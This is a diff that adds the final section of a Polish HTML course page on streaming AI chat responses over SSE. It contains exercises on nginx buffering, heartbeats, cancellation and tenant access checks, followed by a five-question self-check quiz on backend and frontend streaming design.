+  <li>Postaw nginx z <code>proxy_buffering on</code> i usuń z kontrolera <code>X-Accel-Buffering</code>. Zmierz czas do pierwszego słowa, potem napraw konfigurację i porównaj. <code>curl -N</code> sprawdź, że ping pojawia się co 15 s, gdy model „myśli” (WireMock z <code>withFixedDelay</code>).</li>
+  <li>Zatrzymaj długą odpowiedź po 2 s. W Jaegerze sprawdź, że span modelu kończy się kilka sekund po kliknięciu, w logach LiteLLM, że <code>completion_tokens</code> są mniejsze niż przy pełnej odpowiedzi, a w metrykach, że breaker <code>llm</code> nie policzył błędu.</li>
+  <li>Jako <code>piotr</code> zapytaj w rozmowie Acme o HD-2077 i znajdź w strumieniu <code>tool finished</code> z <code>ok: false</code> (<code>ROUTE_MISMATCH</code> z 2.2). Jako <code>ewa@globex</code> sprawdź, że strumień w ogóle się nie otwiera.</li>
+</ol></div>
+
+<h2>Sprawdź się</h2>
+<div class="quiz" data-id="q1" data-correct="1">
+  <p class="q">Dlaczego walidację, <code>AiAvailability</code> i routing modelu wykonujemy przed zwróceniem <code>Flux</code>?</p>
+  <button>Bo format SSE nie pozwala przesyłać JSON-a</button>
+  <button>Bo po pierwszym zdarzeniu status 200 jest już wysłany, więc błąd mógłby być tylko zdarzeniem <code>error</code>, a nie zwykłym 403/404/429 z ProblemDetail</button>
+  <button>Bo Reactor nie obsługuje wyjątków w strumieniach</button>
+  <p class="explain">Po otwarciu strumienia kod HTTP jest przesądzony. Sprawdzenia przed strumieniem dają zwykłe błędy obsługiwane jedną ścieżką, a dla Globex model nie dostaje ani tokenu.</p>
+</div>
+<div class="quiz" data-id="q2" data-correct="2">
+  <p class="q">Dlaczego frontend używa <code>fetch</code> z własnym parserem zamiast <code>EventSource</code>?</p>
+  <button><code>EventSource</code> nie działa na telefonach</button>
+  <button><code>EventSource</code> nie obsługuje UTF-8</button>
+  <button><code>EventSource</code> wysyła tylko GET bez body i nagłówka <code>Authorization</code>, a po zerwaniu sam łączy się ponownie, co dla czatu oznacza kolejne płatne pytanie</button>
+  <p class="explain">Pytanie i token w URL trafiłyby do logów, a samoczynne ponowienie dałoby inną odpowiedź doklejoną do poprzedniej. <code>fetch</code> daje POST, nagłówki i kontrolę nad ponowieniem.</p>
+</div>
+<div class="quiz" data-id="q3" data-correct="0">
+  <p class="q">Odczytany kawałek kończy się na <code>data: {"te</code>. Co robi parser?</p>
+  <button>Trzyma niepełną linię w buforze i dokańcza ją po nadejściu kolejnego kawałka</button>
+  <button>Parsuje JSON i zgłasza błąd składni</button>
+  <button>Odrzuca linię jako uszkodzoną</button>
+  <p class="explain">Granice kawałków sieciowych nie pokrywają się z granicami linii, zdarzeń ani znaków UTF-8. Zdarzenie jest kompletne dopiero po pustej linii.</p>
+</div>
+<div class="quiz" data-id="q4" data-correct="2">
+  <p class="q">Użytkownik zamyka kartę, gdy model od 8 s przetwarza długi kontekst i nie wysłał tekstu. Co sprawia, że backend szybko anuluje wywołanie?</p>
+  <button><code>doOnComplete</code> w serwisie</button>
+  <button>Tomcat natychmiast wykrywa każde rozłączenie</button>
+  <button>Heartbeat: zapis komentarza SSE kończy się błędem I/O, Spring anuluje subskrypcję, a anulowanie płynie do <code>WebClient</code> i LiteLLM</button>
+  <p class="explain">Kontener servletów dowiaduje się o rozłączeniu dopiero przy zapisie. Bez heartbeatu anulowanie nastąpiłoby przy pierwszej <code>delta</code>, po zapłaceniu za część generowania.</p>
+</div>
+<div class="quiz" data-id="q5" data-correct="1">
+  <p class="q">Strumień kończy się <code>done</code> z <code>finishReason: CONTENT_FILTER</code> po kilku zdaniach. Co robimy?</p>
+  <button>Doklejamy „…” i zostawiamy częściowy tekst</button>
+  <button>Zastępujemy częściowy tekst neutralnym komunikatem, do historii zapisujemy tylko znacznik i liczymy to w metrykach</button>
+  <button>Automatycznie ponawiamy, aż filtr przepuści odpowiedź</button>
+  <p class="explain">Częściowa treść zablokowanej odpowiedzi nie powinna zostać na ekranie ani w historii. Ponawianie kosztuje i zwykle kończy się tak samo; metryka pokaże falę takich przypadków.</p>
+</div>
+</main>
+<script src="../assets/highlight.min.js"></script>
+<script src="../assets/course.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
